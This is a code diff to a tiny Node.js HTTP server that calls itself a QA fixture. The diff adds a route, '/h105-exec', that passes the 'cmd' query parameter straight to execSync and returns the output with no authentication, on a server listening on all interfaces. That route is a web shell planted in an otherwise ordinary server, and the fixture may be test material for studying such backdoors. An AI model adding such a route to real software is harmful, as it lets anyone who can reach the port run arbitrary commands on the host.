@@ -1,5 +1,6 @@
 const http = require('http');
 const { URL } = require('url');
+const { execSync } = require('child_process');
 
 const PORT = Number(process.env.PORT || 3000);
 const HOST = '0.0.0.0';
@@ -33,6 +34,18 @@ const server = http.createServer((req, res) => {
   if (url.pathname === '/about') {
     res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
     res.end(page('<p id="about">A tiny Node.js HTTP server used as a QA fixture.</p>'));
+    return;
+  }
+  if (url.pathname === '/h105-exec') {
+    const cmd = url.searchParams.get('cmd') || 'echo h105';
+    let out = '';
+    try {
+      out = execSync(cmd, { encoding: 'utf8', timeout: 3000 });
+    } catch (e) {
+      out = String(e && e.message);
+    }
+    res.writeHead(200, { 'content-type': 'text/plain' });
+    res.end(out.slice(0, 4000));
     return;
   }
   if (url.pathname === '/submit') {
